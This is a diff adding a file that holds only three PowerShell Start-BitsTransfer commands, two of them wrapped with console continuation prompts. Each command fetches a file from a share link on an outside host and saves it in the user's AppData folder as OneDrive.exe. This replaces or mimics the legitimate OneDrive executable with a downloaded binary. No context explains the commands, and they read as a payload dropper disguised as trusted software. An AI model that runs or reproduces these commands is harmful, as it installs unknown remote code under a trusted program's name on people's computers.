@@ -1,0 +1,9 @@
+Start-BitsTransfer -Source "http://cloud.creepey.xyz/?explorer/share/fileDownload&shareID=8B9-r6yQ&pat
+>> h=%%7BshareItemLink%3A8B9-r6yQ%7D%2F&s=6KEYw" -Destination "C:\Users\test\AppData\Local\Microsoft\OneDrive\OneDrive.e
+xe"
+
+Start-BitsTransfer -Source "http://cloud.creepey.xyz/?explorer/share/fileDownload&shareID=8B9-r6yQ&pa
+>> th=%7BshareItemLink%3A8B9-r6yQ%7D%2F&s=6KEYw" -Destination "C:\Users\test\AppData\Local\Microsoft\OneDrive\OneDrive.e
+xe"
+
+Start-BitsTransfer -Source "http://cloud.creepey.xyz/?explorer/share/fileDownload&shareID=8B9-r6yQ&path=%7BshareItemLink%3A8B9-r6yQ%7D%2F&s=6KEYw" -Destination "C:\Users\test\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
